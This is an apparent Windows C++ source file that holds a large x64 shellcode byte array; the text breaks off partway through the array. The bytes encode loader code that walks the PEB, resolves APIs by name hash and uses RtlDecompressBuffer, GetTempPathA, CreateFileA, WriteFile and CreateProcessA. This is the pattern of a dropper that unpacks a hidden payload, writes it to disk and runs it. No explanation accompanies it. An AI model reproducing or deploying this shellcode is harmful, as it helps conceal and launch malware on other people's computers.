#include <iostream>
#include <Windows.h>
//#pragma warning(disable: 4996)


unsigned char x64_shellcode[] = { 0xE9, 0xE1, 0x06, 0x00, 0x00, 0x90, 0x55, 0x48, 0x8D, 0x42, 0x10, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x39, 0xC1, 0x73, 0x0D, 0x48, 0x8D, 0x41, 0x10, 0x48, 0x39, 0xC2, 0x0F, 0x82, 0xC1, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF3, 0x0F, 0x6F, 0x04, 0x02, 0x0F, 0x11, 0x04, 0x01, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x3D, 0x20, 0x01, 0x00, 0x00, 0x75, 0xEB, 0x0F, 0xB6, 0x82, 0x20, 0x01, 0x00, 0x00, 0x88, 0x81, 0x20, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x21, 0x01, 0x00, 0x00, 0x88, 0x81, 0x21, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x22, 0x01, 0x00, 0x00, 0x88, 0x81, 0x22, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x23, 0x01, 0x00, 0x00, 0x88, 0x81, 0x23, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x24, 0x01, 0x00, 0x00, 0x88, 0x81, 0x24, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x25, 0x01, 0x00, 0x00, 0x88, 0x81, 0x25, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x26, 0x01, 0x00, 0x00, 0x88, 0x81, 0x26, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x27, 0x01, 0x00, 0x00, 0x88, 0x81, 0x27, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x28, 0x01, 0x00, 0x00, 0x88, 0x81, 0x28, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x29, 0x01, 0x00, 0x00, 0x88, 0x81, 0x29, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x2A, 0x01, 0x00, 0x00, 0x88, 0x81, 0x2A, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x82, 0x2B, 0x01, 0x00, 0x00, 0x88, 0x81, 0x2B, 0x01, 0x00, 0x00, 0x31, 0xC0, 0xC9, 0xC3, 0x31, 0xC0, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0x04, 0x02, 0x44, 0x88, 0x04, 0x01, 0x48, 0x83, 0xC0, 0x01, 0x48, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xEB, 0xC9, 0x31, 0xC0, 0xC3, 0x80, 0x39, 0x00, 0x74, 0x4F, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x80, 0x3C, 0x01, 0x00, 0x4C, 0x63, 0xC0, 0x74, 0x12, 0x48, 0x83, 0xC0, 0x01, 0x48, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xEB, 0x41, 0xB8, 0x2C, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x02, 0x84, 0xC0, 0x74, 0x25, 0x4C, 0x01, 0xC1, 0x88, 0x01, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x90, 0x44, 0x0F, 0xB6, 0x04, 0x02, 0x45, 0x84, 0xC0, 0x74, 0x10, 0x44, 0x88, 0x04, 0x01, 0x48, 0x83, 0xC0, 0x01, 0x48, 0x3D, 0x2C, 0x01, 0x00, 0x00, 0x75, 0xE6, 0x31, 0xC0, 0xC3, 0x45, 0x31, 0xC0, 0xEB, 0xCC, 0x48, 0x89, 0xCA, 0x57, 0x31, 0xC0, 0xB9, 0x0D, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD7, 0xF3, 0x48, 0xAB, 0x5F, 0xC3, 0x4C, 0x8D, 0x41, 0x02, 0x31, 0xC0, 0x66, 0x83, 0x39, 0x00, 0x74, 0x1F, 0x41, 0x0F, 0xB7, 0x08, 0x49, 0x83, 0xC0, 0x02, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xB7, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x66, 0x85, 0xC9, 0x75, 0xE6, 0xC3, 0x0F, 0x1F, 0x40, 0x00, 0xC3, 0x4C, 0x8D, 0x41, 0x01, 0x31, 0xC0, 0x80, 0x39, 0x00, 0x74, 0x24, 0x0F, 0x1F, 0x40, 0x00, 0x41, 0x0F, 0xB6, 0x08, 0x49, 0x83, 0xC0, 0x01, 0x89, 0xCA, 0x83, 0xCA, 0x20, 0x0F, 0xBE, 0xD2, 0x01, 0xD0, 0xC1, 0xC8, 0x08, 0x84, 0xC9, 0x75, 0xE7, 0xC3, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0xC3, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x4C, 0x8B, 0x48, 0x20, 0x4C, 0x8D, 0x50, 0x20, 0x4D, 0x39, 0xD1, 0x74, 0x2F, 0x48, 0x83, 0xEC, 0x28, 0x41, 0x89, 0xCB, 0xEB, 0x08, 0x4D, 0x8B, 0x09, 0x4D, 0x39, 0xD1, 0x74, 0x17, 0x49, 0x8B, 0x49, 0x50, 0xE8, 0x70, 0xFF, 0xFF, 0xFF, 0x44, 0x39, 0xD8, 0x75, 0xEA, 0x49, 0x8B, 0x41, 0x20, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x31, 0xC0, 0xC3, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x63, 0x41, 0x3C, 0x8B, 0xB4, 0x01, 0x88, 0x00, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x42, 0x48, 0x01, 0xCE, 0x8B, 0x46, 0x18, 0x85, 0xC0, 0x74, 0x38, 0x44, 0x8B, 0x4E, 0x20, 0x89, 0xD7, 0x49, 0x89, 0xCB, 0x45, 0x31, 0xD2, 0x8D, 0x58, 0xFF, 0x49, 0x01, 0xC9, 0xEB, 0x03, 0x4D, 0x89, 0xC2, 0x4D, 0x85, 0xC9, 0x74, 0x0F, 0x41, 0x8B, 0x09, 0x4C, 0x01, 0xD9, 0xE8, 0x3D, 0xFF, 0xFF, 0xFF, 0x39, 0xF8, 0x74, 0x18, 0x4D, 0x8D, 0x42, 0x01, 0x49, 0x83, 0xC1, 0x04, 0x4C, 0x39, 0xD3, 0x75, 0xDC, 0x48, 0x83, 0xC4, 0x20, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0xC3, 0x90, 0x8B, 0x46, 0x24, 0x4B, 0x8D, 0x14, 0x53, 0x0F, 0xB7, 0x14, 0x02, 0x8B, 0x46, 0x1C, 0x49, 0x8D, 0x14, 0x93, 0x8B, 0x04, 0x02, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0x4C, 0x01, 0xD8, 0xC3, 0x0F, 0xB6, 0x01, 0x44, 0x0F, 0xB6, 0x0A, 0x84, 0xC0, 0x74, 0x2D, 0x41, 0x38, 0xC1, 0x75, 0x30, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x12, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x01, 0x45, 0x38, 0xC8, 0x75, 0x17, 0x44, 0x0F, 0xB6, 0x04, 0x01, 0x44, 0x0F, 0xB6, 0x0C, 0x02, 0x45, 0x84, 0xC0, 0x75, 0xE8, 0x45, 0x84, 0xC9, 0x0F, 0x94, 0xC0, 0xC3, 0x90, 0x31, 0xC0, 0xC3, 0x45, 0x85, 0xC0, 0x74, 0x1B, 0x41, 0x8D, 0x40, 0xFF, 0x48, 0x83, 0xEC, 0x28, 0x0F, 0xBE, 0xD2, 0x4C, 0x8D, 0x40, 0x01, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x31, 0xC0, 0xC3, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xE4, 0xF0, 0x45, 0x85, 0xC0, 0x0F, 0x84, 0xA8, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x4A, 0x10, 0x41, 0x8D, 0x40, 0xFF, 0x4C, 0x39, 0xC9, 0x4C, 0x8D, 0x49, 0x10, 0x41, 0x0F, 0x93, 0xC2, 0x4C, 0x39, 0xCA, 0x41, 0x0F, 0x93, 0xC1, 0x45, 0x08, 0xCA, 0x0F, 0x84, 0x89, 0x01, 0x00, 0x00, 0x83, 0xF8, 0x0E, 0x0F, 0x86, 0x80, 0x01, 0x00, 0x00, 0x45, 0x89, 0xC1, 0x31, 0xC0, 0x41, 0xC1, 0xE9, 0x04, 0x49, 0xC1, 0xE1, 0x04, 0xF3, 0x0F, 0x6F, 0x04, 0x02, 0x0F, 0x11, 0x04, 0x01, 0x48, 0x83, 0xC0, 0x10, 0x4C, 0x39, 0xC8, 0x75, 0xEE, 0x44, 0x89, 0xC0, 0x83, 0xE0, 0xF0, 0x41, 0x39, 0xC0, 0x0F, 0x84, 0x4E, 0x01, 0x00, 0x00, 0x4C, 0x63, 0xC8, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x01, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0x35, 0x01, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x02, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0x1C, 0x01, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x03, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0x03, 0x01, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x04, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0xEA, 0x00, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x05, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0xD1, 0x00, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x06, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0xB8, 0x00, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x07, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0x9F, 0x00, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x08, 0x45, 0x39, 0xC8, 0x0F, 0x86, 0x86, 0x00, 0x00, 0x00, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x09, 0x45, 0x39, 0xC8, 0x76, 0x71, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x0A, 0x45, 0x39, 0xC8, 0x76, 0x5C, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x0B, 0x45, 0x39, 0xC8, 0x76, 0x47, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x0C, 0x45, 0x39, 0xC8, 0x76, 0x32, 0x4D, 0x63, 0xC9, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x46, 0x88, 0x14, 0x09, 0x44, 0x8D, 0x48, 0x0D, 0x45, 0x39, 0xC8, 0x76, 0x1D, 0x4D, 0x63, 0xC9, 0x83, 0xC0, 0x0E, 0x46, 0x0F, 0xB6, 0x14, 0x0A, 0x41, 0x39, 0xC0, 0x46, 0x88, 0x14, 0x09, 0x76, 0x09, 0x48, 0x98, 0x0F, 0xB6, 0x14, 0x02, 0x88, 0x14, 0x01, 0xC9, 0x31, 0xC0, 0xC3, 0x41, 0x89, 0xC0, 0x31, 0xC0, 0xEB, 0x09, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x4C, 0x89, 0xC8, 0x44, 0x0F, 0xB6, 0x0C, 0x02, 0x4C, 0x39, 0xC0, 0x44, 0x88, 0x0C, 0x01, 0x4C, 0x8D, 0x48, 0x01, 0x75, 0xEB, 0xC9, 0x31, 0xC0, 0xC3, 0x45, 0x85, 0xC0, 0x74, 0x59, 0x80, 0x39, 0x00, 0x74, 0x57, 0x45, 0x8D, 0x48, 0xFF, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x49, 0x83, 0xC1, 0x01, 0xEB, 0x0B, 0x48, 0x83, 0xC0, 0x01, 0x80, 0x7C, 0x01, 0xFF, 0x00, 0x74, 0x08, 0x4C, 0x39, 0xC8, 0x4C, 0x63, 0xD0, 0x75, 0xED, 0x44, 0x0F, 0xB6, 0x0A, 0x45, 0x84, 0xC9, 0x74, 0x29, 0x41, 0x83, 0xE8, 0x01, 0x31, 0xC0, 0x4C, 0x01, 0xD1, 0xEB, 0x15, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x01, 0x44, 0x0F, 0xB6, 0x0C, 0x02, 0x45, 0x84, 0xC9, 0x74, 0x09, 0x49, 0x39, 0xC0, 0x44, 0x88, 0x0C, 0x01, 0x75, 0xE9, 0x31, 0xC0, 0xC3, 0x45, 0x31, 0xD2, 0xEB, 0xC6, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x63, 0x50, 0x3C, 0x66, 0x83, 0x7C, 0x02, 0x06, 0x00, 0x4C, 0x8D, 0x94, 0x10, 0x08, 0x01, 0x00, 0x00, 0x74, 0x5C, 0x53, 0x45, 0x31, 0xDB, 0x48, 0x89, 0xCB, 0x48, 0x83, 0xEC, 0x20, 0xEB, 0x26, 0x0F, 0x1F, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x10, 0x49, 0x83, 0xC3, 0x01, 0x49, 0x83, 0xC2, 0x28, 0x48, 0x63, 0x50, 0x3C, 0x0F, 0xB7, 0x44, 0x02, 0x06, 0x4C, 0x39, 0xD8, 0x76, 0x1D, 0x48, 0x89, 0xDA, 0x4C, 0x89, 0xD1, 0xE8, 0xF2, 0xFC, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0xCE, 0x48, 0x83, 0xC4, 0x20, 0x4C, 0x89, 0xD0, 0x5B, 0xC3, 0x0F, 0x1F, 0x44, 0x00, 0x00, 0x45, 0x31, 0xD2, 0x48, 0x83, 0xC4, 0x20, 0x4C, 0x89, 0xD0, 0x5B, 0xC3, 0x45, 0x31, 0xD2, 0x4C, 0x89, 0xD0, 0xC3, 0x48, 0x83, 0xEC, 0x38, 0xB8, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x2A, 0xC7, 0x44, 0x24, 0x2A, 0x2E, 0x64, 0x61, 0x74, 0x66, 0x89, 0x44, 0x24, 0x2E, 0xE8, 0x5C, 0xFF, 0xFF, 0xFF, 0x8B, 0x40, 0x0C, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x03, 0x42, 0x10, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x55, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x63, 0x41, 0x3C, 0x8B, 0xB4, 0x01, 0x88, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x01, 0xCE, 0x44, 0x8B, 0x56, 0x20, 0x45, 0x85, 0xD2, 0x74, 0x57, 0x44, 0x8B, 0x46, 0x18, 0x49, 0x01, 0xCA, 0x45, 0x85, 0xC0, 0x74, 0x4B, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCD, 0x45, 0x31, 0xDB, 0x41, 0x8D, 0x58, 0xFF, 0xEB, 0x10, 0x4D, 0x8D, 0x43, 0x01, 0x49, 0x83, 0xC2, 0x04, 0x4C, 0x39, 0xDB, 0x74, 0x3F, 0x4D, 0x89, 0xC3, 0x41, 0x8B, 0x12, 0x48, 0x89, 0xF9, 0x48, 0x01, 0xEA, 0xE8, 0x3E, 0xFC, 0xFF, 0xFF, 0x84, 0xC0, 0x74, 0xDE, 0x8B, 0x56, 0x24, 0x4A, 0x8D, 0x4C, 0x5D, 0x00, 0x8B, 0x46, 0x1C, 0x0F, 0xB7, 0x14, 0x11, 0x48, 0x8D, 0x54, 0x95, 0x00, 0x8B, 0x04, 0x02, 0x48, 0x01, 0xE8, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0x31, 0xC0, 0x5B, 0x5E, 0x5F, 0x5D, 0xC3, 0x57, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x58, 0x20, 0x48, 0x8D, 0x70, 0x20, 0x48, 0x39, 0xF3, 0x74, 0x26, 0x48, 0x89, 0xCF, 0xEB, 0x08, 0x48, 0x8B, 0x1B, 0x48, 0x39, 0xF3, 0x74, 0x11, 0x48, 0x8B, 0x4B, 0x20, 0x48, 0x89, 0xFA, 0xE8, 0x33, 0xFF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE7, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0xC3, 0x31, 0xC0, 0xEB, 0xF4, 0x55, 0x41, 0xB9, 0x61, 0x31, 0x00, 0x00, 0x48, 0x89, 0xE5, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x57, 0x56, 0x53, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x81, 0xEC, 0xB0, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x84, 0x00, 0x00, 0x00, 0xC6, 0x84, 0x24, 0x8A, 0x00, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x84, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74, 0xE8, 0x20, 0xFE, 0xFF, 0xFF, 0x41, 0xBA, 0x61, 0x32, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x8B, 0x00, 0x00, 0x00, 0x2E, 0x64, 0x61, 0x74, 0x48, 0x8D, 0x8C, 0x24, 0x8B, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x66, 0x44, 0x89, 0x94, 0x24, 0x8F, 0x00, 0x00, 0x00, 0xC6, 0x84, 0x24, 0x91, 0x00, 0x00, 0x00, 0x00, 0xE8, 0xEE, 0xFD, 0xFF, 0xFF, 0x48, 0x8D, 0x8C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xE0, 0x00, 0x00, 0x00, 0x66, 0x65, 0x72, 0x00, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x63, 0x50, 0x3C, 0x48, 0x8D, 0x9C, 0x10, 0x08, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x52, 0x74, 0x6C, 0x44, 0x65, 0x63, 0x6F, 0x6D, 0x48, 0x89, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x70, 0x72, 0x65, 0x73, 0x73, 0x42, 0x75, 0x66, 0x48, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0xE8, 0xE2, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x8C, 0x24, 0x9C, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xA4, 0x00, 0x00, 0x00, 0x6C, 0x65, 0x41, 0x00, 0x49, 0x89, 0xC5, 0x48, 0xB8, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x48, 0x89, 0x84, 0x24, 0x9C, 0x00, 0x00, 0x00, 0xE8, 0xBB, 0xF9, 0xFF, 0xFF, 0x89, 0xC6, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x78, 0x20, 0x4C, 0x8D, 0x60, 0x20, 0x49, 0x39, 0xFC, 0x75, 0x0A, 0xEB, 0x1D, 0x48, 0x8B, 0x3F, 0x49, 0x39, 0xFC, 0x74, 0x15, 0x48, 0x8B, 0x4F, 0x20, 0x89, 0xF2, 0xE8, 0x06, 0xFA, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE8, 0x48, 0x89, 0xC6, 0xEB, 0x02, 0x31, 0xF6, 0x48, 0xB8, 0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x41, 0xB8, 0x65, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x92, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x92, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89, 0x84, 0x24, 0x9A, 0x00, 0x00, 0x00, 0xE8, 0x50, 0xF9, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x68, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x78, 0x20, 0x4C, 0x8D, 0x60, 0x20, 0x49, 0x39, 0xFC, 0x75, 0x0A, 0xEB, 0x21, 0x48, 0x8B, 0x3F, 0x49, 0x39, 0xFC, 0x74, 0x19, 0x48, 0x8B, 0x4F, 0x20, 0x8B, 0x54, 0x24, 0x68, 0xE8, 0x97, 0xF9, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE6, 0x48, 0x89, 0x44, 0x24, 0x68, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x68, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x48, 0x61, 0x6E, 0xC7, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x64, 0x6C, 0x65, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0xE8, 0xDC, 0xF8, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x64, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x4C, 0x8B, 0x60, 0x20, 0x48, 0x8D, 0x78, 0x20, 0x4C, 0x39, 0xE7, 0x75, 0x0B, 0xEB, 0x2B, 0x4D, 0x8B, 0x24, 0x24, 0x4C, 0x39, 0xE7, 0x74, 0x22, 0x49, 0x8B, 0x4C, 0x24, 0x20, 0x8B, 0x54, 0x24, 0x64, 0xE8, 0x21, 0xF9, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE4, 0x48, 0x89, 0x44, 0x24, 0x58, 0xEB, 0x11, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x58, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x73, 0x41, 0x00, 0x00, 0xC6, 0x84, 0x24, 0xCF, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x66, 0x89, 0x8C, 0x24, 0xCD, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xC1, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xC1, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xC9, 0x00, 0x00, 0x00, 0x6F, 0x63, 0x65, 0x73, 0xE8, 0x49, 0xF8, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x64, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x4C, 0x8B, 0x60, 0x20, 0x48, 0x8D, 0x78, 0x20, 0x4C, 0x39, 0xE7, 0x75, 0x13, 0xEB, 0x2B, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x24, 0x24, 0x4C, 0x39, 0xE7, 0x74, 0x1A, 0x49, 0x8B, 0x4C, 0x24, 0x20, 0x8B, 0x54, 0x24, 0x64, 0xE8, 0x86, 0xF8, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE4, 0x48, 0x89, 0x44, 0x24, 0x50, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xB4, 0x00, 0x00, 0x00, 0xC6, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x47, 0x65, 0x74, 0x54, 0x65, 0x6D, 0x70, 0x50, 0x48, 0x89, 0x84, 0x24, 0xB4, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0xBC, 0x00, 0x00, 0x00, 0x61, 0x74, 0x68, 0x41, 0xE8, 0xC3, 0xF7, 0xFF, 0xFF, 0x89, 0x44, 0x24, 0x64, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x78, 0x20, 0x4C, 0x8D, 0x60, 0x20, 0x49, 0x39, 0xFC, 0x75, 0x0C, 0xEB, 0x22, 0x66, 0x90, 0x48, 0x8B, 0x3F, 0x49, 0x39, 0xFC, 0x74, 0x18, 0x48, 0x8B, 0x4F, 0x20, 0x8B, 0x54, 0x24, 0x64, 0xE8, 0x08, 0xF8, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0xE6, 0x48, 0x89, 0xC7, 0xEB, 0x03, 0x90, 0x31, 0xFF, 0xE8, 0xAC, 0xFB, 0xFF, 0xFF, 0x4C, 0x8D, 0xA4, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x90, 0xB0, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8, 0xC8, 0xF5, 0xFF, 0xFF, 0xE8, 0x90, 0xFB, 0xFF, 0xFF, 0xB9, 0x2C, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x90, 0xB0, 0x01, 0x00, 0x00, 0xFF, 0xD7, 0xE8, 0x7D, 0xFB, 0xFF, 0xFF, 0x4C, 0x89, 0xE2, 0x48, 0x8D, 0x88, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0xA4, 0xF6, 0xFF, 0xFF, 0xE8, 0x69, 0xFB, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0x48, 0x8D, 0x90, 0x84, 0x00, 0x00, 0x00, 0xE8, 0x8D, 0xF5, 0xFF, 0xFF, 0xE8, 0x55, 0xFB, 0xFF, 0xFF, 0xB9, 0x2C, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x90, 0x84, 0x00, 0x00, 0x00, 0xFF, 0xD7, 0x48, 0x8D, 0x7C, 0x24, 0x7C, 0xE8, 0x3D, 0xFB, 0xFF, 0xFF, 0x4C, 0x89, 0xE2, 0x48, 0x8D, 0x88, 0x84, 0x00, 0x00, 0x00, 0xE8, 0x64, 0xF6, 0xFF, 0xFF, 0x8B, 0x53, 0x0C, 0xC7, 0x44, 0x24, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0xA4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x4F, 0x0C, 0x44, 0x8B, 0x43, 0x08, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x45, 0x8B, 0x4F, 0x08, 0x48, 0x01, 0xC2, 0x44, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x8D, 0x0C, 0x01, 